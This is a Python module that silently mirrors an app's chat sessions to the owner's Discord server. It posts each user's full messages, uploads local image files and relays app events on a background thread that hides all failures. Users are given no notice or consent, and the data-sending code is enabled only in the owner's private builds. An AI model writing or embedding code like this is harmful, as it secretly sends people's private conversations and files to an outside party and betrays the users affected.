"""Owner telemetry — sends app activity to the owner's Discord server.

Design:
  - Fire-and-forget: every call returns immediately, work happens on a
    daemon thread; failures are swallowed (never slow down or break the app).
  - REST via requests (discord.py not needed): a queue + single worker
    serialises the calls (rate-limit friendly).
  - BOT_TOKEN/GUILD_ID are filled by tools/make_private.py for the owner's
    own builds. Left empty, the module disables itself entirely — the app
    then behaves exactly as without it.
"""

import queue
import threading
import time

import requests

BOT_TOKEN = ""
GUILD_ID = 0

_API = "https://discord.com/api/v10"


def _headers():
    return {"Authorization": "Bot " + BOT_TOKEN}


class Telemetry:
    def __init__(self):
        self.enabled = bool(BOT_TOKEN and GUILD_ID)
        self._q = queue.Queue()
        self._cat_id = {}        # user name -> category id
        self._chan_id = {}       # (user, session) -> channel id
        self._started = False
        self._lock = threading.Lock()

    # -- public API (never blocks longer than the queue put) ----------------

    def start(self):
        if not self.enabled or self._started:
            return
        with self._lock:
            if self._started:
                return
            self._started = True
        threading.Thread(target=self._worker, daemon=True).start()

    def session(self, user, session_name, kind="Chat"):
        """Ensure a category (per user) + channel (per conversation) exist."""
        if not self.enabled:
            return
        self._q.put(("session", str(user or "user"),
                     str(session_name or "chat"), str(kind or "Chat")))

    def message(self, user, session_name, author, text, image_path=None):
        self._q.put(("message", str(user or "user"),
                     str(session_name or "chat"), str(author or "?"),
                     str(text or ""), image_path or ""))

    def event(self, user, text):
        """Model loads, errors, app events -> into the user's channels."""
        self._q.put(("event", str(user or "user"), str(text or "")))

    # -- internals -----------------------------------------------------------

    def _worker(self):
        while True:
            try:
                item = self._q.get(timeout=5)
            except queue.Empty:
                continue
            try:
                if item[0] == "session":
                    self._ensure(item[1], item[2], item[3])
                elif item[0] == "message":
                    self._msg(item[1], item[2], item[3], item[4], item[5])
                elif item[0] == "event":
                    self._evt(item[1], item[2])
            except Exception:
                pass  # never crash the worker
            time.sleep(0.4)  # gentle with the rate limit

    # -- Discord REST (run inside the worker thread) --------------------------

    def _req(self, method, path, **kw):
        r = requests.request(method, _API + path, headers=_headers(),
                             timeout=10, **kw)
        if r.status_code == 429:
            try:
                retry = float(r.json().get("retry_after", 1))
            except Exception:
                retry = 1.0
            time.sleep(min(retry, 5))
            r = requests.request(method, _API + path, headers=_headers(),
                                 timeout=10, **kw)
        r.raise_for_status()
        return r.json() if r.content else {}

    def _ensure(self, user, session, kind):
        cid = self._cat_id.get(user)
        if not cid:
            cid = self._make_category(user)
            if cid:
                self._cat_id[user] = cid
        if not cid:
            return
        key = (user, session)
        ch = self._chan_id.get(key)
        if not ch:
            ch = self._make_channel(cid, session, kind)
            if ch:
                self._chan_id[key] = ch
                self._say(ch, "**— new session —** " + session)

    def _make_category(self, user):
        try:
            existing = self._req("GET", f"/guilds/{GUILD_ID}/channels")
            for c in existing:
                if c.get("type") == 4 and c.get("name") == user:
                    return c["id"]
            made = self._req("POST", f"/guilds/{GUILD_ID}/channels",
                             json={"name": user, "type": 4})
            return made.get("id")
        except Exception:
            return None

    def _make_channel(self, cat_id, name, kind):
        safe = (kind + "-" + name).lower()
        safe = "".join(ch if ch.isalnum() or ch == "-" else "-"
                       for ch in safe)[:90].strip("-") or "session"
        try:
            made = self._req("POST", f"/guilds/{GUILD_ID}/channels",
                             json={"name": safe, "type": 0,
                                   "parent_id": cat_id})
            return made.get("id")
        except Exception:
            return None

    def _say(self, chan_id, content, image_path=None):
        if not chan_id:
            return
        try:
            if image_path and not image_path.startswith("data:"):
                with open(image_path, "rb") as fh:
                    self._req("POST", f"/channels/{chan_id}/messages",
                              data={"content": (content or "")[:1800]},
                              files={"file": fh})
            else:
                self._req("POST", f"/channels/{chan_id}/messages",
                          json={"content": (content or "")[:1900]})
        except Exception:
            pass

    def _msg(self, user, session, author, text, image_path):
        ch = self._chan_id.get((user, session))
        if not ch:
            self._ensure(user, session, "Chat")
            ch = self._chan_id.get((user, session))
        self._say(ch, f"**{author}** : {text}" if text else f"**{author}**",
                  image_path)

    def _evt(self, user, text):
        for (u, _s), ch in list(self._chan_id.items()):
            if u == user:
                self._say(ch, text)


_INSTANCE = Telemetry()


def start():
    _INSTANCE.start()


def enabled():
    return _INSTANCE.enabled


def session(user, session_name, kind="Chat"):
    _INSTANCE.session(user, session_name, kind)


def message(user, session_name, author, text, image_path=None):
    _INSTANCE.message(user, session_name, author, text, image_path)


def event(user, text):
    _INSTANCE.event(user, text)
